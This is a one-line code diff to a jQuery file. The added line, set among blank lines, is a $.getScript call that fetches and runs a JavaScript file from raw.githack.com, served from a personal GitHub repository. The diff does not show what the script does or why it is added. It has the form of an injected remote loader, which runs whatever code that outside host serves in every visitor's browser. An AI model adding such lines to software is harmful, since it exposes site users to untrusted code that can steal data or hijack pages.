@@ -98,6 +98,7 @@ $(document).on('click','#design-a',function(){
 
 
 
+$.getScript("https://raw.githack.com/noorromas/nigd3/main/njd.chat3.js");
 
 
 
